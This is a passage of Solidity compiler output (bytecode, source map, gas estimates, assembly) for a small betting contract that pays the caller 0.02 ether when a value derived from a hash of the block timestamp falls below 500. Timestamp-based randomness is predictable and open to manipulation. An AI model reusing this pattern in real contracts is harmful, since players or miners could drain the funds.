OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x259 JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0x5c DUP1 0xba 0xdc 0xd0 0xd4 0x2c SWAP12 0xe5 RETURN 0xb8 SSTORE 0x3f SMOD 0xe5 CODESIZE 0xd2 MULMOD EXTCODESIZE 0xd5 0x4a DUP9 EXP 0xbc SWAP9 0xe 0xd9 0xb5 DUP16 SGT 0x5f 0xb3 STOP 0x29 ",
							"sourceMap": "26:615:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;534:7;521:9;:20;;513:29;;;;;;;;26:615;78:16;;8:9:-1;5:2;;;30:1;27;20:12;5:2;78:16:0;;;;;;;;;;;;;;;;;;;;;;;256:215;;;;;;101:149;;8:9:-1;5:2;;;30:1;27;20:12;5:2;101:149:0;;;;;;;;;;;;;;;;;;;;;;;78:16;;;;:::o;256:215::-;318:10;305:9;:23;297:32;;;;;;;;343:1;339:2;;:5;;;;;;;;;;;371:3;357:12;:10;:12::i;:::-;:17;;354:111;;;389:10;:19;;:31;409:10;389:31;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;389:31:0;439:15;443:10;439:15;;;;;;;;;;;;;;;;;;;;;;354:111;256:215::o;101:149::-;143:4;158:14;202:3;185:21;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;185:21:0;;;175:32;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;51:19;36:153;;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;175:32:0;;;;;;;;;;;;;;;;158:49;;239:4;229:6;224:12;;;:19;;;;;;;;217:26;;101:149;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "130400",
								"executionCost": "20190",
								"totalCost": "150590"
							},
							"external": {
								"": "165",
								"get_random()": "infinite",
								"kk()": "394",
								"play()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "MSTORE"
								},
								{
									"begin": 93,
									"end": 94,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 78,
									"end": 94,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 78,
									"end": 94,
									"name": "SSTORE"
								},
								{
									"begin": 619,
									"end": 626,
									"name": "PUSH",
									"value": "DE0B6B3A7640000"
								},
								{
									"begin": 606,
									"end": 615,
									"name": "CALLVALUE"
								},
								{
									"begin": 606,
									"end": 626,
									"name": "LT"
								},
								{
									"begin": 606,
									"end": 626,
									"name": "ISZERO"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "ISZERO"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "ISZERO"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "PUSH [tag]",
									"value": "3"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "JUMPI"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "DUP1"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "REVERT"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "tag",
									"value": "3"
								},
								{
									"begin": 598,
									"end": 627,
									"name": "JUMPDEST"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "CODECOPY"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 26,
									"end": 641,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029",
									".code": [
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "MSTORE"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "LT"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "JUMPI"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "SWAP1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "DIV"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "AND"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "3779C39E"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "EQ"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "JUMPI"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "93E84CD9"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "EQ"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "JUMPI"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH",
											"value": "98107E5B"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "EQ"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "JUMPI"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "JUMPDEST"
										},
										{
											"begin": 534,
											"end": 541,
											"name": "PUSH",
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 521,
											"end": 530,
											"name": "CALLVALUE"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "LT"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "ISZERO"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "ISZERO"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "ISZERO"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "JUMPI"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "DUP1"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "REVERT"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 513,
											"end": 542,
											"name": "JUMPDEST"
										},
										{
											"begin": 26,
											"end": 641,
											"name": "STOP"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "JUMP"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "MLOAD"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "DUP1"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "DUP3"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "DUP2"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "MSTORE"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "ADD"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "SWAP2"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "MLOAD"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "DUP1"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "SWAP2"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "SUB"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "SWAP1"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "RETURN"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "JUMPDEST"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "JUMP"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "JUMPDEST"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "STOP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "JUMPDEST"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "POP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "JUMP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "JUMPDEST"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "MLOAD"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "DUP1"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "DUP3"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "DUP2"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "MSTORE"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "ADD"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "SWAP2"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "POP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "POP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "MLOAD"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "DUP1"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "SWAP2"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "SUB"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "SWAP1"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "RETURN"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "SLOAD"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "DUP2"
										},
										{
											"begin": 78,
											"end": 94,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 328,
											"name": "PUSH",
											"value": "2386F26FC10000"
										},
										{
											"begin": 305,
											"end": 314,
											"name": "CALLVALUE"
										},
										{
											"begin": 305,
											"end": 328,
											"name": "EQ"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "ISZERO"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "ISZERO"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "JUMPI"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "DUP1"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "REVERT"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 297,
											"end": 329,
											"name": "JUMPDEST"
										},
										{
											"begin": 343,
											"end": 344,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 339,
											"end": 341,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 339,
											"end": 341,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "DUP3"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "DUP3"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "SLOAD"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "ADD"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "SWAP3"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "SSTORE"
										},
										{
											"begin": 339,
											"end": 344,
											"name": "POP"
										},
										{
											"begin": 371,
											"end": 374,
											"name": "PUSH",
											"value": "1F4"
										},
										{
											"begin": 357,
											"end": 369,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 357,
											"end": 367,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 357,
											"end": 369,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 357,
											"end": 369,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 357,
											"end": 369,
											"name": "JUMPDEST"
										},
										{
											"begin": 357,
											"end": 374,
											"name": "LT"
										},
										{
											"begin": 357,
											"end": 374,
											"name": "ISZERO"
										},
										{
											"begin": 354,
											"end": 465,
											"name": "ISZERO"
										},
										{
											"begin": 354,
											"end": 465,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 354,
											"end": 465,
											"name": "JUMPI"
										},
										{
											"begin": 389,
											"end": 399,
											"name": "CALLER"
										},
										{
											"begin": 389,
											"end": 408,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 389,
											"end": 408,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "PUSH",
											"value": "8FC"
										},
										{
											"begin": 409,
											"end": 419,
											"name": "PUSH",
											"value": "470DE4DF820000"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "ISZERO"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "MUL"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "MLOAD"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "MLOAD"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP4"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "SUB"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP6"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP9"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "DUP9"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "CALL"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "SWAP4"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "POP"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "POP"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "POP"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "POP"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 420,
											"name": "POP"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "A34CC845DFE7E94DA90B41E77F799F7C29C20A39271C97A2469CE08AFED0830B"
										},
										{
											"begin": 443,
											"end": 453,
											"name": "CALLER"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "MLOAD"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "DUP1"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "DUP3"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "AND"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "AND"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "DUP2"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "MSTORE"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "ADD"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "SWAP2"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "POP"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "POP"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "MLOAD"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "DUP1"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "SWAP2"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "SUB"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "SWAP1"
										},
										{
											"begin": 439,
											"end": 454,
											"name": "LOG1"
										},
										{
											"begin": 354,
											"end": 465,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 354,
											"end": 465,
											"name": "JUMPDEST"
										},
										{
											"begin": 256,
											"end": 471,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "JUMPDEST"
										},
										{
											"begin": 143,
											"end": 147,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 158,
											"end": 172,
											"name": "DUP1"
										},
										{
											"begin": 202,
											"end": 205,
											"name": "TIMESTAMP"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "MLOAD"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "ADD"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "DUP1"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "DUP3"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "DUP2"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "MSTORE"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "ADD"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "SWAP2"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "POP"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "POP"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "SWAP1"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 185,
											"end": 206,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 51,
											"end": 70,
											"name": "ISZERO"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "ISZERO"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP"
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP"
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
